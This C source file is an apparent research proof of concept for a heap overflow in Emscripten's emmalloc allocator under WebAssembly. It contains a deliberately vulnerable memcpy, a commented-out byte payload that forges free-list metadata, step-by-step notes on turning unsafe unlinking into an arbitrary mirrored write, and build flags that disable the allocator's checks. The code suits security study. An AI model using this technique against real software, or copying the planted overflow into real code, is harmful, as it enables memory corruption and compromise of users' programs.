#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <inttypes.h> // uintptr_t
#include <emscripten.h>

// NOTE Must compile with -s MALLOC=emmalloc, since dlmalloc 2.8.5. implements safe unlinking

// NOTE Must compile without -g flag with emcc in order to disable assertions (that check unlinking).

// NOTE For easier debugging of the allocator, you can change
// emsdk/upstream/emscripten/tools/system_libs.py, libmalloc, cflags
// to include '-fno-inline-functions', '-g'.

/*
 * Just some helpers for printing the heap state.
 */

int alignment(void * ptr) {
    int trailing_zeroes = __builtin_ctz((uintptr_t) ptr);
    return 2 << trailing_zeroes;
}

void print_ptr(void * ptr) {
    if (ptr) {
        printf("%p (%lu), align=%d\n", ptr, (uintptr_t) ptr, alignment(ptr));
    } else {
        printf("NULL\n");
    }
}

// From emmalloc.cpp:
struct free_info {
  void * prev;
  void * next;
};

typedef struct region {
    // Bitfield, i.e., the LSB is used, all the other bits are totalSize.
    size_t used : 1;
    size_t totalSize : 31;

    // Each memory area knows its previous neighbor, as we hope to merge them.
    // To compute the next neighbor we can use the total size, and to know
    // if a neighbor exists we can compare the region to lastRegion
    struct region* prev;

    // Up to here was the fixed metadata, of size 16. The rest is either
    // the payload, or freelist info.
    union {
        struct free_info free_info;
        // NOTE flexible array member is not supported in a union, I wonder why it works for emscripten?
        char payload[1];
    };
} region;

void print_heap_metadata_emmalloc(void * payload) {
    uint8_t * payload_bytes = payload;
    region* region = (struct region*) (payload_bytes - 8);
    printf("region at: ");
    print_ptr(region);
    printf("totalSize: 0x%x (%d) bytes\n", region->totalSize, region->totalSize);
    printf("state:     %s\n", (region->used) ? "used" : "free");
    printf("prev:      ");
    print_ptr(region->prev);
    printf("next():    ");
    print_ptr((char*) region + region->totalSize);
    if (region->used) {
        printf("payload at: ");
        print_ptr(&region->payload);
        printf("payload:   \"%s\"\n", region->payload);
    } else {
        printf("free_info at: ");
        print_ptr(&region->free_info);
        printf("FI.prev:   ");
        print_ptr(region->free_info.prev);
        printf("FI.next:   ");
        print_ptr(region->free_info.next);
    }
    printf("\n");
}


/*
 * Vulnerable function, exported to JS (see wrapper code below).
 */

__attribute__((used))
void main_bytes(void * input, size_t size) {

    printf("input: %s\n", (char *) input);
    printf("size:  %zu\n\n", size);


    uint8_t * alloc1 = malloc(8);
    printf("alloc1\n");
    print_heap_metadata_emmalloc(alloc1);

    // This is the allocation that is getting overflown into (more specifically its metadata).
    // - Allocate enough space to make sure we don't run out of the global heap altogether.
    // - In this case, we cannot NOT allocate it, because then alloc1 == lastRegion, which
    //   prevents the allocator from merging (which is the code path, we exploit).
    uint8_t * alloc2 = malloc(1000);
    printf("alloc2\n");
    print_heap_metadata_emmalloc(alloc2);


    // Heap overflow.
    // Corrupting metadata of alloc2:
    // - Mark it as free (used := 0), such that it gets merged into alloc1 upon free.
    // - Setup fake FreeInfo.prev and .next pointer for mirrored write primitive.
    // See below for details.
    printf("memcpy\n\n");
    memcpy(alloc1, input, size);

    printf("alloc1\n");
    print_heap_metadata_emmalloc(alloc1);

    printf("alloc2 (corrupted)\n");
    print_heap_metadata_emmalloc(alloc2);


    // Trigger the vulnerability by free-ing alloc1:
    // - We want to manipulate alloc2 to let the allocator think it is a free region.
    // - Then, it will try to merge alloc2 and alloc1.
    // - For which it will remove alloc2 from the free list.
    // - For which it will unlink alloc2's FreeInfo -> classic unsafe unlinking :-)
    // - Call chain: free() -> stopUsing() -> mergeIntoExistingFreeRegion() -> removeFromFreeList().
    printf("free alloc1\n\n");
    free(alloc1);

    printf("alloc1\n");
    print_heap_metadata_emmalloc(alloc1);

    printf("alloc2\n");
    print_heap_metadata_emmalloc(alloc2);

}

/*
 * Setup and exploit code, but vulnerability is in main_bytes().
 */

int main(int argc, char ** argv) {
    // Make main_bytes() available conveniently in JavaScript (just pass a JS array).
    EM_ASM({
        window.main_bytes = function(array) { 
            ccall("main_bytes", null, ["array", "number"], [array, array.length]);
        };
    });

    // // Let's just exploit right here on the spot (but you could also
    // // simply execute this JS in the developer console in the browser.)
    // EM_ASM(main_bytes([
    //     // Regular payload data for alloc1.
    //     65, 65, 65, 65, 65, 65, 65, 0, 
        
    //     // Overwrite metadata of alloc2, which is right next to alloc1:

    //     // size + used flag:
    //     // - "+ 0" means the used bit is 0 (= free region).
    //     // - "16<<1" is the size, including metadata (16 bytes).
    //     //   The value is not used by the exploited code in the allocator except for error checking, 
    //     //   so you have to make sure two things (when compiled with assertions):
    //     //   1. size - METADATA_SIZE > 0, i.e., size MUST BE > 8.
    //     //   2. this + size < DYNAMIC_TOP, i.e., size should not be too large
    //     (16<<1) + 0, 0, 0, 0,

    //     // Region.prev: UNUSED
    //     0, 0, 0, 0,

    //     // Now the two mirrored writes, where the following happens during unlinking:
    //     // *(prev+4) = next, and
    //     // *(next)   = prev.
    //     // I.e., both values will be used as pointers and as values (hence a "mirrored write").

    //     // Region.FreeInfo.prev:
    //     0, 0x10, 0, 0, // TODO change to your liking
    //     // Region.FreeInfo.next: UNUSED
    //     0, 0x20, 0, 0, // TODO change to your liking
    // ]));
    
    // To check whether exploit was successful (i.e. the writes were performed), type in JS console:
    // HEAP32[0x1000+4 >> 2] == 0x2000
    // HEAP32[0x2000   >> 2] == 0x1000
    // both should give true.
    // (The >> 2 is just because HEAP32 operates on words, i.e., 4 bytes at a time, so byte 
    // addresses have to be divided by 4.)

    return 0;
}
